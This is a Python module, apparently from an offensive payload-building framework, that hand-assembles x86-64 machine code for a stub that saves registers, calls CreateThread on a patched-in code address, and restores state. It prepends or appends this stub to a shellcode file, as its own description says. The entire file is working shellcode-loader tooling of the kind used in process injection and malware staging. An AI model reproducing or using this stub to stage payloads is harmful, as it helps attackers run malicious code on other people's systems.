from enum import Enum
from typing import ClassVar

from pcr.lib.artifact import Artifact
from pcr.lib.link import Link


class WhereEnum(str, Enum):
    start = "start"
    end = "end"


class CreateThreadStub(Link):
    yaml_tag: ClassVar[str] = "!modifier.CreateThreadStub"
    where: WhereEnum

    def deduce_artifact(self) -> Artifact:
        return Artifact(
            type = self.input.output.type,
            os = self.input.output.os,
            arch = self.input.output.arch,
            path = str(self.config["main"].tmp / f"stage.{self.id}.bin"),
        )

    def offset(self):
        return self.output.read().find(bytes(self.craft()))

    def pRemoteCodeOffset(self):
        return self.offset() + len(self.prologue()) + 18

    def createThreadOffset(self):
        return self.offset() + len(self.prologue()) + 31

    def craft(self):
        payload = self.prologue() + self.stub() + self.epilogue()
        return payload

    def length(self):
        payload = self.prologue() + self.stub() + self.epilogue()
        return len(payload)

    def prologue(self):
        return [
            # push rax
            0x50,

            # push rcx
            0x51,

            # push rdx
            0x52,

            # push r8
            0x41, 0x50,

            # push r9
            0x41, 0x51,

            # push r10
            0x41, 0x52,

            # push r11
            0x41, 0x53,

            # pushfq
            0x9C
        ]

    def stub(self):
        return [
            # xor rcx, rcx
            0x48, 0x31, 0xc9,

            # mov qword ptr [rsp+28h], rcx
            0x48, 0x89, 0x4c, 0x24, 0x28,

            # mov qword ptr [rsp+20h], rcx
            0x48, 0x89, 0x4c, 0x24, 0x20,

            # mov r9, rcx
            0x49, 0x89, 0xc9,

            # pRemoteCode
            # mov r8, 0xCCCCCCCCCCCCCCCC
            0x49, 0xb8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,

            # mov rdx, rcx
            0x48, 0x89, 0xca,

            # CreateThread
            # mov rax, 0xCCCCCCCCCCCCCCCC
            0x48, 0xb8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,

            # call rax
            0xff, 0xd0
        ]

    def epilogue(self):
        return [
            # popfq
            0x9D,

            # pop r11
            0x41, 0x5B,

            # pop r10
            0x41, 0x5A,

            # pop r9
            0x41, 0x59,

            # pop r8
            0x41, 0x58,

            # pop rdx
            0x5A,

            # pop rcx
            0x59,

            # pop rax
            0x58,

            # ret
            0xC3
        ]

    def process(self):
        self.output = self.deduce_artifact()
        data = self.input.output.read()
        payload = bytes(self.craft())

        if self.where == WhereEnum.start:
            data = payload + data
        else:
            data = data + payload

        self.output.write(data)

    def info(self) -> str:
        return "Prepend CreateThread stub to a shellcode"
